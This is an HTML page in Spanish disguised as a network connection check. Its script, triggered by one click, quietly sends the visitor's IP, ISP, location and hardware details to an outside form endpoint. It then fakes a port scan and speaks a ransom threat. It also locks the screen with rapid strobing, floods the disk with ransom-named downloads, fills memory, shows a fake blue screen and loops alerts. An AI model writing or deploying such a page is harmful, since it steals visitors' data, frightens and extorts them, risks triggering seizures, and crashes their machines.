<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Sincronizaci贸n de Red Cr铆tica</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Consolas', monospace; overflow: hidden; margin: 0; }
        #terminal { padding: 20px; font-size: 11px; height: 100vh; display: flex; flex-direction: column; }
        .danger { color: #f00; font-weight: bold; }
        #bsod { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0078d7; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 100px; z-index: 10000; }
    </style>
</head>
<body onclick="iniciarInfiltracionTotal()">

    <div id="terminal">
        <div id="output">> ESPERANDO AUTORIZACIN DE NODO...</div>
        <div style="margin-top: 20px; color: #fff; border: 1px solid #0f0; padding: 10px; width: fit-content; cursor: pointer;">
            HAGA CLIC PARA VALIDAR CONEXIN
        </div>
    </div>

    <div id="bsod">
        <div style="font-size: 100px;">:(</div>
        <h2>Se ha producido un error cr铆tico en su sistema.</h2>
        <p>El sistema detect贸 una exfiltraci贸n de datos masiva y se bloque贸 para proteger su hardware.</p>
        <p>C贸digo de detenci贸n: <span id="ip-display"></span>_NETWORK_PENETRATION</p>
    </div>

    <script>
        const FORM_ID = "xykdyebg";
        let logs = document.getElementById('output');

        function addLog(text, isRed = false) {
            const div = document.createElement('div');
            if (isRed) div.className = "danger";
            div.innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
            logs.appendChild(div);
        }

        async function iniciarInfiltracionTotal() {
            addLog("INICIANDO PENETRACIN SILENCIOSA...");
            
            // 1. OBTENCIN DE DATOS PROFUNDOS
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/D";

            const data = {
                "STATUS": "PENETRACION_EXITOSA",
                "IP": ipData.ip,
                "GPU": gpu,
                "RAM": navigator.deviceMemory + "GB",
                "CORES": navigator.hardwareConcurrency,
                "OS": navigator.platform,
                "ISP": ipData.org,
                "GEO": `${ipData.city}, ${ipData.country_name}`
            };

            // 2. EXFILTRACIN INMEDIATA
            fetch(`https://formspree.io/f/${FORM_ID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            // 3. ESCANEO DE PUERTOS LOCALES (Falso/Simulado para P谩nico)
            addLog("ESCANEANDO PUERTOS LAN...");
            const ports = [21, 22, 80, 443, 3306, 8080];
            ports.forEach(p => addLog(`PUERTO ${p}: ABIERTO - EXPLOTANDO...`, true));

            // 4. VOZ DE AMENAZA
            const voz = new SpeechSynthesisUtterance("He penetrado tu sistema. Tu IP " + ipData.ip + " est谩 marcada. Paga ahora.");
            voz.lang = 'es-ES';
            voz.pitch = 0.2;
            window.speechSynthesis.speak(voz);

            // 5. ATAQUE DE RECURSOS (BLOQUEO)
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            
            const storage = [];
            document.getElementById('ip-display').innerText = ipData.ip;

            setInterval(() => {
                // Ataque Visual Estrobosc贸pico
                document.body.style.backgroundColor = document.body.style.backgroundColor === 'black' ? 'white' : 'black';
                
                // Bombardeo de Descargas (Satura Disco y Red)
                const a = document.createElement('a');
                a.href = 'data:text/plain;base64,UEFHQU1FCg==';
                a.download = `RESCATE_${Math.random()}.txt`;
                a.click();

                // Llenar RAM
                for(let i=0; i<500; i++) storage.push(new Array(1000000).fill(""));

                // Mostrar BSOD
                document.getElementById('bsod').style.display = 'block';

                // Alertas Infinitas
                alert("SISTEMA PENETRADO\n\nDATOS EXFILTRADOS A SERVIDOR MAESTRO\n\nIP: " + ipData.ip);
                
                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
            }, 100);
        }
    </script>
</body>
</html>
